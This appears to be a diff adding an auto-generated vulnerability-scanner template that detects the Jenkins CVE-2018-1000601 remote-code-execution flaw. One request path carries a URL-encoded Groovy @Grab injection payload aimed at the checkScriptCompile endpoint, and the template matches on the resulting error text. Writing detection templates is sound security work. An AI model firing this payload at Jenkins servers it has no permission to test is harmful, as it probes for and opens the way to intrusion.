@@ -1,0 +1,23 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-jenkins-cve_2018_1000601
+info:
+  name: "Jenkins CVE_2018_1000601"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, jenkins, ref-poc, rce]
+  description: "由参考项目脚本静态导入：Jenkins/CVE_2018_1000601（类型 RCE）。 原脚本另含 favicon 指纹 ['23e8c7bd78e8cd826c5a6073b15068b1']，本引擎暂不支持 favicon 匹配。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/favicon.ico"
+      - "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "package#vulntest"
